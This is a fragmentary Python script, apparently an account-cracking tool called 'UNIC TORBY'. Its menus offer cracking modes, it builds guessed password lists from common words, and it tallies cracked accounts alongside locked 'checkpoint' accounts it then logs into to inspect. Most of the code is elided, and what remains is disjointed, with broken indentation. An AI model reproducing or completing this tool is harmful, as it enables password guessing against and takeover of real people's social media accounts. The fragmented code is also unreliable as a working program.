...
def banner():
    print("""\x1b[0;37m Uthsara       ┌──────────────────────────────┐\n    jayasingha │  Script By Jayasingha HUS    │\n               │     •• UNIC TORBY ••         │\n               └──────────────────────────────┘""")
...
def country():
    ...
    print("%s[%s4%s] %sSrilanka" % (k, p, k, p))
...
def menu():
    ...
    print((k+"║ ["+p+"9"+p+"]"+p+" Check Account Checkpoint Options "))
...
def pilihcrack(file):
  ...
  print((k+"║ ["+p+"2"+k+"]"+p+" Api + BD ("+k+"Fast"+p+")"))
  print((k+"║ ["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")"))
  print((k+"║ ["+p+"4"+k+"]"+p+" Mbasic + BD ("+k+"Slow"+p+")"))
		...
		if len(i)<3:
			...
			if len(i)==3 or len(i)==4 or len(i)==5:
				...
				if "id" in ct:
					...
					results.append("pakaya")
					results.append("ponnaya")
					results.append("qwerty")
					results.append("hukapan")
	return results
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : ponnaya,password,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : ponnaya,srilanka,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
...
def results(Unic,Torby):
        if len(Unic) !=0:
                print(("[OK] : "+str(len(Unic))))
        if len(Torby) !=0:
                print(("[CP] : "+str(len(Torby))))
        if len(Unic) ==0 and len(Torby) ==0:
                print("\n")
...
def cek_opsi():
	...
	try:
		...
		exit(p+" ["+k+"•"+m+"•"+p+"] Files %s%s%s There is not any!"%(h,files,p))
	print(p+" ["+k+"•"+m+"•"+p+"] Total Account Cp : "+str(len(buka_baju)))
	print(p+" ["+k+"•"+m+"•"+p+"] Check Checkpoint Option, Please Wait...")
	for memek in buka_baju:
		qwerty = memek.replace("\n","")
		titid  = qwerty.split(" • ")
		print("\033[1;37m\n [\033[1;33m•\033[1;91m•\033[1;37m] "+qwerty.replace(" + ",""))
		try:
...
def check_in(user, pasw):
	...
	if "checkpoint" in ses.cookies:
		...
		print(p+" ["+k+"•"+m+"•"+p+"] Total Options Available "+str(len(ngew)))
		...
		print(p+" ["+k+"•"+m+"•"+p+"] Login Failed, Wrong ID/Pass\n")
